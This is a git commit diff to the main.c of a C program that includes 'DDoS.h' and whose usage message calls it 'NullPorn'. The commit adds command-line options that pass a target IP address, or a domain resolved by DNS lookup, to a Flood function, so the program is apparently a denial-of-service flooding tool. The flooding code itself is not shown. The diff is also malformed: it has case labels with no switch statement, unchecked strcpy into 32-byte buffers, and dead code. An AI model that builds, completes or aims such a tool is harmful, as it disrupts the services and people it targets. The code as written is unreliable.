c507508db3714559365448b1a2fb9cdb81fd88bf
hh-Naram <hh.naram@gmail.com>
2022-07-21 18:21:47 +0300

    Use command line arguments

--- src/main.c
+++ src/main.c
@@ -1,13 +1,40 @@
 #include "FileUtils.h"
 #include "DDoS.h"
 
-int main()
+int main(int argc, char* argv[])
 {
-    char* file = OpenFile("IpAddresses.txt");
-    uint32_t amountOfLines = 0;
-    for (uint32_t i = 0; i < strlen(file); i++)
-        if (file[i] == '\n')
-            amountOfLines++;
-    printf("%d\n", amountOfLines);
-    free(file);
+    char filepath[32];
+    char* fileBuffer;
+
+    int option = 0;
+    while ((option = getopt(argc, argv, "d:D:i:I")) != -1)
+    {
+    case 'i': {
+            char ip[32];
+            strcpy(ip, optarg);
+            Flood(ip);
+            return 0;
+        } break;
+    case 'd': {
+            char domain[32];
+            strcpy(domain, optarg);
+            char* ip = DNSLookup(domain); 
+            Flood(ip);
+            free(ip);
+            return 0;
+        } break;
+
+    case 'D': break; // TODO
+    case 'I': break; // TODO
+                     
+    default: {
+            fprintf(stderr, "[USAGE]: \"sudo ./NullPorn -[iIdD] [arguments]\".\n");
+            return -1;
+         } break;
+    }
+
+    bool fileRead = false;
+
+    if (fileRead)
+        free(fileBuffer);
 }
